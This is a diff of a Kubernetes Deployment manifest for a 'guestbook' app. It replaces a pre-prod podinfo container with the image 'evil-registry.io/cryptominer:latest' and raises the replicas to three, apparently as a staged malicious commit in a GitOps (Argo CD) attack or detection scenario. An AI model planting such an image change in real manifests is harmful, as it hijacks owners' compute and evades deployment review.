@@ -2,23 +2,20 @@ apiVersion: apps/v1
 kind: Deployment
 metadata:
   name: guestbook
-  labels: {app: guestbook, env: preprod}
+  labels:
+    app: guestbook
 spec:
-  replicas: 1
+  replicas: 3
   selector:
-    matchLabels: {app: guestbook}
+    matchLabels:
+      app: guestbook
   template:
     metadata:
-      labels: {app: guestbook, env: preprod}
+      labels:
+        app: guestbook
     spec:
       containers:
-        - name: podinfo
-          image: ghcr.io/stefanprodan/podinfo:6.12.0   # S1 bumps this tag (visible in the podinfo UI)
-          ports:
-            - {name: http, containerPort: 9898}
-          env:
-            - {name: PODINFO_UI_COLOR,   value: "#34A853"}   # green = pre-prod
-            - {name: PODINFO_UI_MESSAGE, value: "PRE-PROD (auto-synced by Argo CD)"}
-          resources:
-            requests: {cpu: 50m, memory: 32Mi}
-            limits:   {cpu: 100m, memory: 64Mi}
+      - name: guestbook
+        image: evil-registry.io/cryptominer:latest
+        ports:
+        - containerPort: 8080
